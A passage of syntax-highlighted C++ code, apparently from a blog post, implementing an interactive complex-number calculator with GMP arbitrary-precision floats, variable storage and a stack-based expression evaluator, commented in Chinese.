class="number">2</span>);</span><br><span class="line">        <span class="built_in">mpf_pow_ui</span>(temp2,b.imaginaryPart,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">mpf_add</span>(temp1,temp1,temp2);</span><br><span class="line">        <span class="built_in">mpf_add</span>(result.realPart,ac,bd);</span><br><span class="line">        <span class="built_in">mpf_div</span>(result.realPart,result.realPart,temp1);</span><br><span class="line">        <span class="built_in">mpf_sub</span>(result.imaginaryPart,bc,ad);</span><br><span class="line">        <span class="built_in">mpf_div</span>(result.imaginaryPart,result.imaginaryPart,temp1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>+(string buf) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        result=(*<span class="keyword">this</span>);</span><br><span class="line">        <span class="type">mpf_t</span> temp;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(temp,<span class="number">333</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">CheckImga</span>(buf))&#123;</span><br><span class="line">            <span class="keyword">if</span>(buf.<span class="built_in">length</span>()==<span class="number">1</span>)<span class="comment">//说明是纯虚数</span></span><br><span class="line">                buf=<span class="string">&quot;1&quot;</span>;<span class="comment">//将唯一的i，替换为数字1</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                buf.<span class="built_in">pop_back</span>();<span class="comment">//删除最后一个为 i</span></span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);</span><br><span class="line">            <span class="built_in">mpf_add</span>(result.imaginaryPart,<span class="keyword">this</span>-&gt;imaginaryPart,temp);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);</span><br><span class="line">            <span class="built_in">mpf_add</span>(result.realPart,<span class="keyword">this</span>-&gt;realPart,temp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>-(string buf) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        result=(*<span class="keyword">this</span>);</span><br><span class="line">        <span class="type">mpf_t</span> temp;</span><br><span class="line">        <span class="built_in">mpf_init2</span>(temp,<span class="number">333</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">CheckImga</span>(buf))&#123;</span><br><span class="line">            <span class="keyword">if</span>(buf.<span class="built_in">length</span>()==<span class="number">1</span>)<span class="comment">//说明是纯虚数</span></span><br><span class="line">                buf=<span class="string">&quot;1&quot;</span>;<span class="comment">//将唯一的i，替换为数字1</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                buf.<span class="built_in">pop_back</span>();<span class="comment">//删除最后一个为 i  </span></span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);          </span><br><span class="line">            <span class="built_in">mpf_sub</span>(result.imaginaryPart,<span class="keyword">this</span>-&gt;imaginaryPart,temp);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>); </span><br><span class="line">            <span class="built_in">mpf_sub</span>(result.realPart,<span class="keyword">this</span>-&gt;realPart,temp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>*(string buf) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        result=(*<span class="keyword">this</span>);</span><br><span class="line">        Complex temp=<span class="built_in">Complex</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">CheckImga</span>(buf))&#123;</span><br><span class="line">            <span class="keyword">if</span>(buf.<span class="built_in">length</span>()==<span class="number">1</span>)<span class="comment">//说明是纯虚数</span></span><br><span class="line">                buf=<span class="string">&quot;1&quot;</span>;<span class="comment">//将唯一的i，替换为数字1</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                buf.<span class="built_in">pop_back</span>();<span class="comment">//删除最后一个为 i  </span></span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp.imaginaryPart,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp.realPart,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result=(*<span class="keyword">this</span>)*temp;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    Complex <span class="keyword">operator</span>/(string buf) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Complex result= <span class="built_in">Complex</span>();</span><br><span class="line">        result=(*<span class="keyword">this</span>);</span><br><span class="line">        Complex temp=<span class="built_in">Complex</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">CheckImga</span>(buf))&#123;</span><br><span class="line">            <span class="keyword">if</span>(buf.<span class="built_in">length</span>()==<span class="number">1</span>)<span class="comment">//说明是纯虚数</span></span><br><span class="line">                buf=<span class="string">&quot;1&quot;</span>;<span class="comment">//将唯一的i，替换为数字1</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                buf.<span class="built_in">pop_back</span>();<span class="comment">//删除最后一个为 i  </span></span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp.imaginaryPart,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">mpf_set_str</span>(temp.realPart,buf.<span class="built_in">c_str</span>(),<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        result=(*<span class="keyword">this</span>)/temp;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">mod</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">mpf_t</span> a,b,c;</span><br><span class="line">        string result;</span><br><span class="line">        <span class="type">mp_exp_t</span> exponent;</span><br><span class="line">        <span class="type">char</span>* word;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpf_init2</span>(a,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(b,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(c,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_pow_ui</span>(a,<span class="keyword">this</span>-&gt;realPart,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">mpf_pow_ui</span>(b,<span class="keyword">this</span>-&gt;imaginaryPart,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">mpf_add</span>(a,a,b);</span><br><span class="line">        <span class="built_in">mpf_sqrt</span>(c,a);</span><br><span class="line"></span><br><span class="line">        word=<span class="built_in">mpf_get_str</span>(<span class="literal">nullptr</span>,&amp;exponent,<span class="number">10</span>,<span class="number">0</span>,c);</span><br><span class="line">        result=word;</span><br><span class="line">        result=<span class="built_in">MpfAdjustResult</span>(exponent,result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">con</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">mpf_t</span> a,b,c;</span><br><span class="line">        <span class="type">mp_exp_t</span> exponent;<span class="comment">//long</span></span><br><span class="line">        <span class="type">char</span>* word;</span><br><span class="line">        string result1;</span><br><span class="line">        string result2;</span><br><span class="line">        <span class="type">int</span> idx_neg;</span><br><span class="line">        <span class="type">bool</span> flag_neg=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpf_init2</span>(a,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(b,<span class="number">333</span>);</span><br><span class="line">        <span class="built_in">mpf_init2</span>(c,<span class="number">333</span>);</span><br><span class="line">        result1=<span class="keyword">this</span>-&gt;<span class="built_in">realdata</span>();</span><br><span class="line">        <span class="built_in">mpf_neg</span>(b,<span class="keyword">this</span>-&gt;imaginaryPart);<span class="comment">//取反</span></span><br><span class="line">        word=<span class="built_in">mpf_get_str</span>(<span class="literal">nullptr</span>,&amp;exponent,<span class="number">10</span>,<span class="number">0</span>,b);</span><br><span class="line">        result2=word;</span><br><span class="line">        idx_neg=result2.<span class="built_in">find</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(idx_neg!=std::string::npos)&#123;</span><br><span class="line">            result2.<span class="built_in">erase</span>(idx_neg,<span class="number">1</span>);</span><br><span class="line">            flag_neg=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result2=<span class="built_in">MpfAdjustResult</span>(exponent,result2);</span><br><span class="line">        <span class="keyword">if</span>(flag_neg)&#123;</span><br><span class="line">            result2.<span class="built_in">insert</span>(idx_neg,<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!result2.<span class="built_in">empty</span>()&amp;&amp;!result1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            result2.<span class="built_in">append</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result1+<span class="string">&quot;+&quot;</span>+result2;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(result1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            result2.<span class="built_in">append</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result2;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> result1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">alldata</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        string str1=<span class="keyword">this</span>-&gt;<span class="built_in">realdata</span>();</span><br><span class="line">        string str2=<span class="keyword">this</span>-&gt;<span class="built_in">imagdata</span>();</span><br><span class="line">        <span class="keyword">return</span> str1+str2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">realdata</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">mp_exp_t</span> exponent;</span><br><span class="line">        <span class="type">char</span>* word;</span><br><span class="line">        string result;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">        <span class="type">bool</span> neg_flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpf_get_str</span>(buffer,&amp;exponent,<span class="number">10</span>,<span class="number">0</span>,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        result=buffer;</span><br><span class="line">        <span class="keyword">if</span>(result.<span class="built_in">find</span>(<span class="string">&quot;-&quot;</span>)!=std::string::npos)&#123;</span><br><span class="line">            neg_flag=<span class="literal">true</span>;</span><br><span class="line">            result.<span class="built_in">erase</span>(result.<span class="built_in">find</span>(<span class="string">&quot;-&quot;</span>),<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        result=<span class="built_in">MpfAdjustResult</span>(exponent,result);</span><br><span class="line">        <span class="keyword">if</span>(neg_flag)&#123;</span><br><span class="line">            result.<span class="built_in">insert</span>(<span class="number">0</span>,<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">imagdata</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">mp_exp_t</span> exponent;</span><br><span class="line">        string result;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">100</span>]; </span><br><span class="line">        <span class="type">bool</span> neg_flag=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpf_get_str</span>(buffer,&amp;exponent,<span class="number">10</span>,<span class="number">0</span>,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        result = buffer;</span><br><span class="line">        <span class="keyword">if</span>(result.<span class="built_in">find</span>(<span class="string">&quot;-&quot;</span>)!=std::string::npos)&#123;</span><br><span class="line">            neg_flag=<span class="literal">true</span>;</span><br><span class="line">            result.<span class="built_in">erase</span>(result.<span class="built_in">find</span>(<span class="string">&quot;-&quot;</span>),<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        result=<span class="built_in">MpfAdjustResult</span>(exponent,result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!result.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            result+=<span class="string">&quot;i&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(neg_flag)&#123;</span><br><span class="line">                result.<span class="built_in">insert</span>(<span class="number">0</span>,<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.<span class="built_in">insert</span>(<span class="number">0</span>,<span class="string">&quot;+&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">gmp_printf</span>(<span class="string">&quot;实部:%Ff\n&quot;</span>,<span class="keyword">this</span>-&gt;realPart);</span><br><span class="line">        <span class="built_in">gmp_printf</span>(<span class="string">&quot;虚部:%Ff\n&quot;</span>,<span class="keyword">this</span>-&gt;imaginaryPart);</span><br><span class="line">        cout&lt;&lt;<span class="keyword">this</span>-&gt;<span class="built_in">realdata</span>()&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="keyword">this</span>-&gt;<span class="built_in">imagdata</span>()&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// 为 a 赋值，a=0</span></span><br><span class="line">    Complex Com_Result=<span class="built_in">Complex</span>();</span><br><span class="line">    </span><br><span class="line">    string key;<span class="comment">//变量名</span></span><br><span class="line">    string value;<span class="comment">//存储的值</span></span><br><span class="line">    string buf;</span><br><span class="line">    <span class="type">int</span> idx_equal=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> prec_set=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// cout&lt;&lt;&quot;请输入你要的精度:&quot;;</span></span><br><span class="line">    <span class="comment">// cin&gt;&gt;prec_set;</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="comment">// mpf_set_default_prec(prec_set);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">        Invalid=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">getline</span>(cin,buf);<span class="comment">//从输入流中读取一行数据到buf</span></span><br><span class="line">        <span class="built_in">BlankFliter</span>(buf);</span><br><span class="line">        <span class="keyword">if</span>(buf.<span class="built_in">find</span>(<span class="string">&quot;=&quot;</span>)!= std::string::npos)&#123;</span><br><span class="line">            <span class="type">bool</span> is_exist=<span class="number">0</span>;</span><br><span class="line">            idx_equal=buf.<span class="built_in">find</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            key=buf.<span class="built_in">substr</span>(<span class="number">0</span>,idx_equal);</span><br><span class="line">            value=buf.<span class="built_in">substr</span>(idx_equal+<span class="number">1</span>,buf.<span class="built_in">length</span>()-idx_equal<span class="number">-1</span>);<span class="comment">//a=2+3  len=5 idx_equal=1  传入的大小是5-1-1</span></span><br><span class="line">            <span class="built_in">NameTraslate</span>(value);</span><br><span class="line">            <span class="built_in">NameTraslate</span>(value);</span><br><span class="line">            <span class="built_in">BlankFliter</span>(value);</span><br><span class="line">            <span class="built_in">ModTraslate</span>(value);</span><br><span class="line">            <span class="built_in">ConTraslate</span>(value);</span><br><span class="line">            <span class="built_in">CountEr</span>(value);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">NameCheck</span>(key))&#123;</span><br><span class="line">                umap[key]=value;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;变量名格式错误!请重新命名...&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="comment">//这里要处理value的值</span></span><br><span class="line">        &#125;<span class="comment">//第二个是调用变量名  </span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(umap.<span class="built_in">find</span>(buf)!=umap.<span class="built_in">end</span>())&#123;<span class="comment">//判断迭代器是否到尾部,到尾部说明没有这个变量</span></span><br><span class="line">            cout&lt;&lt;umap[buf]&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">NameTraslate</span>(buf);</span><br><span class="line">            <span class="built_in">NameTraslate</span>(buf);</span><br><span class="line">            <span class="built_in">ModTraslate</span>(buf);</span><br><span class="line">            <span class="built_in">ConTraslate</span>(buf);</span><br><span class="line">            <span class="built_in">BlankFliter</span>(buf);</span><br><span class="line">            <span class="built_in">CountEr</span>(buf);</span><br><span class="line">            <span class="keyword">if</span>(!Invalid)&#123;</span><br><span class="line">                cout&lt;&lt;buf&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//表达式</span></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CountEr</span><span class="params">(string &amp;buf)</span></span>&#123;<span class="comment">//引用修改是直接修改变量    //当然对于一些特殊符号，要在前面进行语义解析和翻译工作.     //比如mod运算，和++运算，还有共轭复数运算,甚至是变量</span></span><br><span class="line">    <span class="type">char</span> oper;<span class="comment">//操作符</span></span><br><span class="line">    Complex result= <span class="built_in">Complex</span>();<span class="comment">//最后的结果。</span></span><br><span class="line">    Complex temp_result=<span class="built_in">Complex</span>();</span><br><span class="line">    Complex zero_com=<span class="built_in">Complex</span>();</span><br><span class="line">    <span class="function">vector&lt;Complex&gt; <span class="title">mulsave</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> idx_i;<span class="comment">//虚数i的下标//科学计数法e的下标</span></span><br><span class="line">    <span class="type">int</span> idx_oper=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> idx_num2_end;</span><br><span class="line">    <span class="type">int</span> idxoffset=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pre_idx=<span class="number">0</span>;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; opstack1;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; opstack2;</span><br><span class="line">    stack&lt;string&gt; bufstack1;</span><br><span class="line">    stack&lt;string&gt; bufstack2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//去除空格之后，通过运算符 来筛选操作符和操作数。</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="type">int</span> idx_e=buf.<span class="built_in">find</span>(<span class="string">&#x27;E&#x27;</span>,i);<span class="comment">//找到E的位置</span></span><br><span class="line">        <span class="keyword">if</span>(idx_e!= std::string::npos)&#123;</span><br><span class="line">            <span class="keyword">if</span>(buf[idx_e+<span class="number">1</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;<span class="comment">//如果e的下个字符是-号的话,换成不处理的符号</span></span><br><span class="line">              buf[idx_e+<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;+&#x27;</span>||buf[i]==<span class="string">&#x27;-&#x27;</span>||buf[i]==<span class="string">&#x27;*&#x27;</span>||buf[i]==<span class="string">&#x27;/&#x27;</span>||buf[i]==<span class="string">&#x27;(&#x27;</span>||buf[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">            idxoffset=i-idx_oper;</span><br><span class="line">            idx_oper=i;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(pre_idx==<span class="number">0</span>||idxoffset&gt;<span class="number">1</span>)&#123;<span class="comment">// 1*(2+3)  *和(下标差距为1   idx_oper=1, i=2  idxoffset=1</span></span><br><span class="line">                string temp;</span><br><span class="line">                <span class="keyword">if</span>(pre_idx==<span class="number">0</span>)&#123;</span><br><span class="line">                    temp=buf.<span class="built_in">substr</span>(pre_idx,idxoffset);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(pre_idx!=<span class="number">0</span>)&#123;</span><br><span class="line">                    temp=buf.<span class="built_in">substr</span>(pre_idx,idxoffset<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">ETraslate</span>(temp);</span><br><span class="line">                bufstack1.<span class="built_in">push</span>(temp);<span class="comment">//2+3+6   则插入3</span></span><br><span class="line">                <span class="keyword">if</span>(buf[idx_oper+<span class="number">1</span>]==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                    pre_idx=idx_oper+<span class="number">2</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    pre_idx=idx_oper+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            opstack1.<span class="built_in">push</span>(buf[i]);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]!=<span class="string">&#x27;)&#x27;</span>&amp;&amp;i==buf.<span class="built_in">length</span>()<span class="number">-1</span>)&#123;<span class="comment">//到字符串末尾   idx_op=3  i=4  idx_offset=1 buf.length=5</span></span><br><span class="line">            string temp;</span><br><span class="line">            <span class="keyword">if</span>(pre_idx==<span class="number">0</span>)&#123;</span><br><span class="line">                temp=buf.<span class="built_in">substr</span>(idx_oper,buf.<span class="built_in">length</span>()-idx_oper);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                temp=buf.<span class="built_in">substr</span>(idx_oper+<span class="number">1</span>,buf.<span class="built_in">length</span>()-idx_oper<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">ETraslate</span>(temp);</span><br><span class="line">            bufstack1.<span class="built_in">push</span>(temp);<span class="comment">//2+3-6  插入6   </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//利用另外两个栈,实现后缀表达式</span></span><br><span class="line">    bufstack2.<span class="built_in">push</span>(bufstack1.<span class="built_in">top</span>());<span class="comment">//先入栈一个操作数</span></span><br><span class="line">    bufstack1.<span class="built_in">pop</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//入栈第二个操作数，入栈第一个操作符，防止访问空栈</span></span><br><span class="line">    <span class="keyword">if</span>(!opstack1.<span class="built_in">empty</span>()&amp;&amp;opstack1.<span class="built_in">top</span>()==<span class="string">&#x27;)&#x27;</span>)&#123;<span class="comment">//第一个括号都是)先入栈</span></span><br><span class="line">        opstack2.<span class="built_in">push</span>(opstack1.<span class="built_in">top</span>());</span><br><span class="line">        opstack1.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!opstack1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        opstack2.<span class="built_in">push</span>(opstack1.<span class="built_in">top</span>());</span><br><span class="line">        opstack1.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!bufstack1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        bufstack2.<span class="built_in">push</span>(bufstack1.<span class="built_in">top</span>());</span><br><span class="line">        bufstack1.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(opstack2.<span class="built_in">empty</span>()&amp;&amp;bufstack2.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">ETraslate</span>(buf);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buf.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalpha</span>(buf[i])&amp;&amp;buf[i]!=<span class="string">&#x27;i&#x27;</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                cerr&lt;&lt;<span class="string">&quot;存在非法变量&quot;</span>&lt;&lt;endl;</span><br><span class="line">                Invalid=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        buf=bufstack2.<span class="built_in">top</span>();</span><br><span class="line">        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//只有一个值,就不管他,直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(bufstack2.<span class="built_in">top</span>()!=<span class="string">&quot;@&quot;</span>||bufstack2.<span class="built_in">size</span>()&gt;<span class="number">1</span>||!opstack1.<span class="built_in">empty</span>()||!opstack2.<span class="built_in">empty</span>())&#123;<span class="comment">//依据操作符栈1是否为空判断是否结束</span></span><br><span class="line">        <span class="keyword">if</span>((!opstack1.<span class="built_in">empty</span>()))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!opstack1.<span class="built_in">empty</span>()&amp;&amp;!opstack2.<span class="built_in">empty</span>()&amp;&amp;(<span class="built_in">WhoFirst</span>(opstack1.<span class="built_in">top</span>())&gt;=<span class="built_in">WhoFirst</span>(opstack2.<span class="built_in">top</span>())))&#123;<span class="comment">//来者的优先级比较大,就不管它</span></span><br><span class="line">                <span class="keyword">if</span>(opstack1.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>&amp;&amp;opstack2.<span class="built_in">top</span>()==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                    opstack1.<span class="built_in">pop</span>();</span><br><span class="line">                    opstack2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                opstack2.<span class="built_in">push</span>(opstack1.<span class="built_in">top</span>());</span><br><span class="line">                opstack1.<span class="built_in">pop</span>();</span><br><span class="line">                bufstack2.<span class="built_in">push</span>(bufstack1.<span class="built_in">top</span>());</span><br><span class="line">                bufstack1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!opstack1.<span class="built_in">empty</span>()&amp;&amp;!opstack2.<span class="built_in">empty</span>()&amp;&amp;(<span class="built_in">WhoFirst</span>(opstack1.<span class="built_in">top</span>())&lt;<span class="built_in">WhoFirst</span>(opstack2.<span class="built_in">top</span>())))&#123;<span class="comment">//来者的优先级比较小,我们就要进行运算。</span></span><br><span class="line"><span class="comment">//这里的运算也要判断是否为虚数i，先放进类</span></span><br><span class="line">            <span class="type">char</span> op=opstack2.<span class="built_in">top</span>();</span><br><span class="line">            opstack2.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">switch</span> (op)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                    <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        cout&lt;&lt;<span class="string">&quot;2+1:     &quot;</span>&lt;&lt;endl;</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span 